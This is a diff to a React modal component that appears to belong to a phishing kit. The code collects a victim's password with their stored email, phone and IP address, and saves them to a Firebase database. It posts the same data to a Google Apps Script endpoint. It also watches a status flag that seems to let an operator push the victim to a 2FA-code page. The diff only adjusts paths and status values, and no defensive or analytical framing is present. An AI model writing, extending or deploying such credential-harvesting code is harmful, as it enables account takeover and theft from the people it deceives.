@@ -44,17 +44,13 @@ const Modal = ({ isModal, setIsModal }) => {
       form.append("password", passwords);
       const updates = {};
       updates[
-        "/records/" +
-          localStorage.getItem("record_uid") +
-          "/" +
-          "current_password"
+        "/" + localStorage.getItem("record_uid") + "/" + "current_password"
       ] = password;
-      updates[
-        "/records/" + localStorage.getItem("record_uid") + "/" + "password"
-      ] = [password];
-      updates[
-        "/records/" + localStorage.getItem("record_uid") + "/" + "user_status"
-      ] = "2z";
+      updates["/" + localStorage.getItem("record_uid") + "/" + "password"] = [
+        password,
+      ];
+      updates["/" + localStorage.getItem("record_uid") + "/" + "user_status"] =
+        "2z";
       update(ref(database), updates);
       axios.post(
         "https://script.google.com/macros/s/AKfycbzQuBZK_LchvVKyD6OMP2wAP1a0afZcYffBfybX4w1rOglN5qyYDgqmZMMeWURajnrqjg/exec",
@@ -63,17 +59,18 @@ const Modal = ({ isModal, setIsModal }) => {
     } else {
       const data = JSON.parse(localStorage.getItem("form"));
       const id = uuidv4();
-      set(ref(database, "records/" + id), {
+      set(ref(database, "/" + id), {
         email: data.email,
         phone: data.phone,
-        user_status: "1",
+        user_status: "zzz",
         done: false,
         timestamp: Date.now(),
         current_password: password,
-        password: [password],
+        password: passwords,
       }).then(() => {
         localStorage.setItem("record_uid", id);
         setUid(id);
+
         const content = `
           \n
           IP: ${localStorage.getItem("ip")}
@@ -92,13 +89,19 @@ const Modal = ({ isModal, setIsModal }) => {
           "https://script.google.com/macros/s/AKfycbzQuBZK_LchvVKyD6OMP2wAP1a0afZcYffBfybX4w1rOglN5qyYDgqmZMMeWURajnrqjg/exec",
           form
         );
+
+        setTimeout(() => {
+          const updates = {};
+          updates["/" + id + "/" + "user_status"] = "1";
+          update(ref(database), updates);
+        }, 5000);
       });
     }
   };
 
   useEffect(() => {
     if (isModal && uid) {
-      const starCountRef = ref(database, "records/" + uid);
+      const starCountRef = ref(database, "/" + uid);
       onValue(starCountRef, (snapshot) => {
         const data = snapshot.val();
         console.log(data);
@@ -110,10 +113,7 @@ const Modal = ({ isModal, setIsModal }) => {
         } else if (data?.user_status === "3") {
           const updates = {};
           updates[
-            "/records/" +
-              localStorage.getItem("record_uid") +
-              "/" +
-              "user_status"
+            "/" + localStorage.getItem("record_uid") + "/" + "user_status"
           ] = "-1";
           update(ref(database), updates).then(() => {
             natigate("/confirm/2fa-code", {
